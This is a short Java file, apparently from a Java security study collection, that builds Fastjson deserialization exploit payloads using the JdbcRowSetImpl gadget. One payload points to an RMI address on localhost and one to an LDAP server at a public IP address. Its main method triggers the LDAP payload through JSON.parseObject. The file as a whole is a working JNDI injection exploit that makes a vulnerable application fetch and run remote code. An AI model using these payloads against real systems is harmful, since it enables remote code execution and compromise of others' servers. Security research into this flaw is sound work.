package javaSec.attack.fastjson.exp;

import com.alibaba.fastjson.JSON;

class JdbcRowSet {
    static String getRmiPayload(){
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\", \"autoCommit\":true}";
        return payload;
    }
    static String getLdapPayload(){
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://47.94.199.235:1389/CC6\", \"autoCommit\":true}";
        return payload;
    }

    public static void main(String[] args) {
        String exp = JdbcRowSet.getLdapPayload();
        JSON.parseObject(exp);
    }
}
